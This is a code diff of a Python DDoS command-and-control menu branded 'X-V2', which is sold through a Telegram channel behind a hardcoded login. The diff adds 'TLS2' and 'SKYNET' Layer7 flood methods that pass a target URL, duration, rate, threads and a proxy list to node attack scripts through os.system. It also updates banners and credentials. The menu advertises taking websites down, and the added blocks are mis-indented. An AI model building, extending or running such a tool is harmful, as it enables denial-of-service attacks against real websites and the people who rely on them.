@@ -23,28 +23,19 @@ def layer7():
     clear()
     si()
     print(Colorate.Horizontal(Colors.red_to_white,'''
-                                                        
-                ===========.                     .==-                 
-                :%@@%####%@@-                   +@@=                  
-                  +@@-    -@@*                -%@*.                   
-                   :@@*    .#@%:            :%@%:                     
-                    .#@%:    +@@=          *@@=                       
-                      +@@=    :%@*       =@@+                         
-                       :%@#.    *@%-   -%@#.                          
-                         *@@:    =@@*.#@%-                            
-                          =@@+    :%@@@=                              
-                           .%@%.    +@@-                              
-                             +@@-    :@@*                             
-                              =@@*    .#@%:                           
-                             +@@%@%:    =@@+                          
-                           -@@#. +@@+    .%@#                         
-                         .#@%-    -%@#.    *@%-                       
-                        +@@=        *@@-    -@@*                      
-                      =@@*           -@@*    .%@%.                    
-                    :%@#:             .%@%.    +@@-                   
-                  .*@%-                 +@@=    :%@*                  
-                 +@@+                    :%@#****#@@@:                
-                =++.                      .++++++++++=.               
+               
+       .:                     ::        
+        -#+=.             .-+*=         
+         -**#*.          *###+          
+          ==*#-   -=+   .=-++           
+          .::--:.-###-. :-===           
+           .:--:=:::--:=*-.             
+               :-++=**+:                
+                 .=-+:                  
+                   =                    
+               
+ '                                                 
+          
                  Telegram:t.me/teamARXU                                                         
 
                 LIST OF LAYER7 METHODS
@@ -55,11 +46,12 @@ def layer7():
 !HTTPS - SEND ATTACK WITH HTTPS-FLOOD
 !RAPID - SEND HIGH RPS FOR HTTP DDOS 
 !BLACK - FUCKING WEBSITE UNTIL DOWN
-!CRASH - LOW QUALITY WEBSITE ATTACK
-
+!CRASH - LOW QUALITY WEBSITE TAKE DOWN
+!TLS2 - UPDATED VERSION OF TLS-1
+!SKYNET- SEND HIGH PACKETS
 
 HOW TO USE
-TLS https://example.com 120         TLS URL TIME
+TLS https://example.com 120   TLS URL TIME
 '''))
 
 def menu():
@@ -68,27 +60,16 @@ def menu():
    , "WELCOME TO  X-V2 | USER: ROOT| PLAN :: VVIP | Proxy: " + bots_str + " |FEEL HAPPY TO USE"))
     print("")
     banner = '''
-                    
-                :%@@%####%@@-                   +@@=                  
-                  +@@-    -@@*                -%@*.                   
-                   :@@*    .#@%:            :%@%:                     
-                    .#@%:    +@@=          *@@=                       
-                      +@@=    :%@*       =@@+                         
-                       :%@#.    *@%-   -%@#.                          
-                         *@@:    =@@*.#@%-                            
-                          =@@+    :%@@@=                              
-                           .%@%.    +@@-                              
-                             +@@-    :@@*                             
-                              =@@*    .#@%:                           
-                             +@@%@%:    =@@+                          
-                           -@@#. +@@+    .%@#                         
-                         .#@%-    -%@#.    *@%-                       
-                        +@@=        *@@-    -@@*                      
-                      =@@*           -@@*    .%@%.                    
-                    :%@#:             .%@%.    +@@-                   
-                  .*@%-                 +@@=    :%@*                  
-                 +@@+                    :%@#****#@@@:                
-               
+   
+               .:                     ::        
+        -#+=.             .-+*=         
+         -**#*.          *###+          
+          ==*#-   -=+   .=-++           
+          .::--:.-###-. :-===           
+           .:--:=:::--:=*-.             
+               :-++=**+:                
+                 .=-+:                  
+                   = 
 
 Type Layer7 or l7 or L7 To See Layer7 Methods⠀⠀⠀⠀⠀  
 
@@ -114,6 +95,37 @@ def main():
             except IndexError:
                 print('Usage: METHOD URL TIME');
                 print('Example: METHOD URL TIME');
+                
+ elif "TLS2" in cnc:  # TLSFLOOD
+            try:
+                target = cnc.split()[1]
+                time = cnc.split()[2]
+                Rate = cnc.split()[3]
+                threads = cnc.split()[4]
+                proxyFile = cnc.split()[5]
+                os.system(f'node TLS2.js {target} {time} {Rate} {threads} proxy.txt')
+            except IndexError:
+                print('Usage: TLS2 <Target> <Time> <Rate> <threads> ')
+                print('Example: TLS2 https://example.com 120 512 1000')
+                print(' Tls-Flood ') 
+   
+   
+   
+           elif "SKYNET" in cnc:  # SKYNET
+            try:
+                target = cnc.split()[1]
+                time = cnc.split()[2]
+                Rate = cnc.split()[3]
+                threads = cnc.split()[4]
+                proxyFile = cnc.split()[5]
+                os.system(f'node TLS3.js {target} {time} {Rate} {threads} proxy.txt')
+            except IndexError:
+                print('Usage: Skynet <Target> <Time> <Rate> <threads> ')
+                print('Example: Skynet https://example.com 120 512 1000')
+                print(' Skynet ')             
+            
+            
+      
                 
         elif "RAPID" in cnc:
             try: 
@@ -182,13 +194,13 @@ CLEAR - CLEAR TERMINAL
 
 def login():
     clear()
-    user = "SHAD56"
-    passwd = "MD5"
+    user = "ARXU"
+    passwd = "RX"
     username = input("</> Username: ")
     password = getpass.getpass(prompt='</> Password: ')
     if username != user or password != passwd:
         print("")
-        print("Password/Username or got wrong?? You have to buy subscriptions from Our channel")        
+        print("Password or Username is invalid?? You have to buy subscriptions from Our channel")        
         sys.exit(1)
     elif username == user and password == passwd:
         print("WELCOME TO X-V2")
